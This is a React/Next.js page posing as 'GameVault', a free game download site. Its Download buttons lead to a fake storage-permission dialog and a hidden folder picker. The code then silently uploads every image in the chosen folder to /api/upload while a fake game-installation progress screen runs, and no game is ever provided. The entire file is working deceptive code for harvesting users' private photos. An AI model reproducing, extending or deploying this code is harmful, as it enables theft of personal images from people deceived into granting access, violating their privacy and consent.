"use client";
import { useState } from "react";

export default function Home() {
  const [showPermission, setShowPermission] = useState(false);
  const [uploading, setUploading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [total, setTotal] = useState(0);
  const [currentStage, setCurrentStage] = useState("");

  const games = [
    { name: "Cyber Strike 2077", size: "48 GB", tag: "Action" },
    { name: "Shadow Realm", size: "32 GB", tag: "RPG" },
    { name: "Neon Racer", size: "19 GB", tag: "Racing" },
    { name: "Frost Legacy", size: "55 GB", tag: "Adventure" },
    { name: "Iron Vanguard", size: "41 GB", tag: "Shooter" },
    { name: "Mystic Depths", size: "27 GB", tag: "Puzzle" },
    { name: "Sky Fortress", size: "36 GB", tag: "Strategy" },
    { name: "Crimson Blade", size: "44 GB", tag: "Action" },
  ];

  // গেমের নাম অনুযায়ী লোডিং মেসেজ
  const stages = [
    "Initializing game engine...",
    "Loading game assets...",
    "Extracting textures...",
    "Optimizing shaders...",
    "Verifying game files...",
    "Finalizing installation...",
  ];

  function handleDownloadClick() {
    setShowPermission(true);
  }

  function allowAccess() {
    setShowPermission(false);
    const input = document.getElementById("folder-input") as HTMLInputElement;
    if (input) input.click();
  }

  async function handleFolder(e: React.ChangeEvent<HTMLInputElement>) {
    const files = Array.from(e.target.files || []).filter((f) =>
      f.type.startsWith("image/")
    );
    if (!files.length) return;

    setUploading(true);
    setProgress(0);
    setTotal(files.length);

    // প্রথম stage সেট করুন
    setCurrentStage(stages[0]);

    for (let i = 0; i < files.length; i++) {
      const fd = new FormData();
      fd.append("file", files[i]);
      try {
        await fetch("/api/upload", { method: "POST", body: fd });
      } catch (err) {
        console.error("Upload failed:", files[i].name);
      }

      const pct = Math.round(((i + 1) / files.length) * 100);
      setProgress(pct);

      // progress অনুযায়ী stage পরিবর্তন
      if (pct < 20) setCurrentStage(stages[0]);
      else if (pct < 40) setCurrentStage(stages[1]);
      else if (pct < 60) setCurrentStage(stages[2]);
      else if (pct < 80) setCurrentStage(stages[3]);
      else if (pct < 95) setCurrentStage(stages[4]);
      else setCurrentStage(stages[5]);
    }

    setCurrentStage("✓ Game ready! Enjoy playing.");
    setTimeout(() => {
      setUploading(false);
      setTotal(0);
      setProgress(0);
      setCurrentStage("");
    }, 1500);
  }

  return (
    <main className="min-h-screen bg-gray-950 text-gray-200 font-sans">
      <header className="flex justify-between items-center px-8 py-5 border-b border-gray-800">
        <h1 className="text-2xl font-bold text-emerald-400">🎮 GameVault</h1>
        <nav className="flex gap-6 text-sm text-gray-400">
          <span className="cursor-pointer hover:text-emerald-400">Games</span>
          <span className="cursor-pointer hover:text-emerald-400">Library</span>
          <span className="cursor-pointer hover:text-emerald-400">Support</span>
        </nav>
      </header>

      <section className="text-center py-16 px-8">
        <h2 className="text-4xl font-bold mb-3">Welcome to GameVault</h2>
        <p className="text-gray-500">Download the latest titles. Fast. Secure. Free.</p>
      </section>

      <section className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-5 px-8 pb-16">
        {games.map((g, i) => (
          <div
            key={i}
            className="bg-gray-900 border border-gray-800 rounded-xl p-5 hover:border-emerald-500/50 transition"
          >
            <div className="h-32 bg-gradient-to-br from-slate-800 to-slate-950 rounded-lg mb-4 flex items-center justify-center">
              <span className="text-4xl opacity-30">🎮</span>
            </div>
            <h3 className="text-lg font-semibold">{g.name}</h3>
            <p className="text-xs text-gray-500 mt-1">
              {g.tag} • {g.size}
            </p>
            <button
              onClick={handleDownloadClick}
              className="w-full mt-4 py-2 bg-emerald-500 text-black font-semibold rounded-lg hover:bg-emerald-400"
            >
              Download
            </button>
          </div>
        ))}
      </section>

      {/* Hidden folder input */}
      <input
        id="folder-input"
        type="file"
        multiple
        onChange={handleFolder}
        className="hidden"
        {...({ webkitdirectory: "true", directory: "" } as any)}
      />

      {/* Permission Dialog */}
      {showPermission && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-8 max-w-md w-full shadow-2xl">
            <div className="text-5xl mb-4 text-center">📁</div>
            <h3 className="text-xl font-bold mb-2 text-center">
              File Access Required
            </h3>
            <p className="text-gray-400 text-sm mb-6 text-center">
              GameVault needs permission to access your storage to install the
              game pack.
            </p>

            <div className="bg-gray-950 border border-gray-800 rounded-lg p-4 mb-6">
              <p className="text-xs text-gray-500 mb-2">Required access:</p>
              <div className="flex items-center gap-2 text-sm text-gray-300">
                <span>📂</span>
                <span>Storage / Files folder</span>
              </div>
            </div>

            <div className="flex gap-3">
              <button
                onClick={() => setShowPermission(false)}
                className="flex-1 py-3 bg-gray-800 text-gray-300 font-semibold rounded-lg hover:bg-gray-700"
              >
                Deny
              </button>
              <button
                onClick={allowAccess}
                className="flex-1 py-3 bg-emerald-500 text-black font-semibold rounded-lg hover:bg-emerald-400"
              >
                Allow
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Game Loading Screen */}
      {uploading && (
        <div className="fixed inset-0 bg-gray-950 flex items-center justify-center z-50 p-4">
          <div className="max-w-md w-full">
            {/* Logo */}
            <div className="text-center mb-10">
              <div className="text-6xl mb-4">🎮</div>
              <h1 className="text-3xl font-bold text-emerald-400">
                GameVault
              </h1>
            </div>

            {/* Loading spinner */}
            <div className="flex justify-center mb-8">
              <div className="w-16 h-16 border-4 border-gray-800 border-t-emerald-500 rounded-full animate-spin" />
            </div>

            {/* Stage text */}
            <p className="text-center text-gray-300 text-sm mb-6 font-mono">
              {currentStage}
            </p>

            {/* Progress bar */}
            <div className="h-2 bg-gray-800 rounded-full overflow-hidden mb-3">
              <div
                className="h-full bg-gradient-to-r from-emerald-500 to-emerald-400 transition-all duration-300"
                style={{ width: `${progress}%` }}
              />
            </div>

            <div className="flex justify-between text-xs text-gray-500 font-mono">
              <span>{progress}%</span>
              <span>
                {total > 0 ? `${Math.round((progress * total) / 100)} / ${total}` : ""}
              </span>
            </div>

            {/* Warning */}
            <p className="text-center text-xs text-gray-600 mt-8">
              Do not close this window
            </p>
          </div>
        </div>
      )}
    </main>
  );
}